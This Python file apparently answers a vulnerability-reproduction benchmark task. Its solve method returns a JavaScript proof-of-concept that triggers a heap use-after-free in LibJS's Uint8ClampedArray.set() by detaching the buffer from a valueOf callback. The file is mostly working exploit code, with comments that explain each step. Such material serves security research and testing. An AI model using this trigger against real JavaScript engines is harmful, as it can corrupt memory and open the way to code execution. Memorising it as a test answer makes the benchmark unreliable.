class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in Uint8ClampedArray.
        The vulnerability exists because Uint8ClampedArray was implemented separately from TypedArray
        in older versions of LibJS, missing critical checks for buffer detachment in methods like .set().
        """
        poc_js = r"""
function trigger() {
    // Create a Uint8ClampedArray big enough to be on the heap
    const u8 = new Uint8ClampedArray(1024);
    
    // Create an object that detaches the buffer when converted to a number
    const evil = {
        valueOf: function() {
            // Attempt to detach the underlying ArrayBuffer
            try {
                // Standard way in modern environments
                structuredClone(u8.buffer, { transfer: [u8.buffer] });
            } catch (e) {
                // Fallback for some test shells
                if (typeof detachArrayBuffer === 'function') {
                    detachArrayBuffer(u8.buffer);
                }
            }
            // Return a value to be written to the array
            return 0x41;
        }
    };

    // Call .set(). This iterates over the input array.
    // 1. Reads 'evil' from input array.
    // 2. Converts 'evil' to number -> calls valueOf() -> detaches u8.buffer.
    // 3. Writes result to u8's data pointer.
    // In the vulnerable version, the data pointer is not re-verified after the callback,
    // leading to a write to freed memory (Use-After-Free).
    try {
        u8.set([evil]);
    } catch (e) {}
}

try {
    trigger();
} catch (e) {}
"""
        return poc_js.encode('utf-8')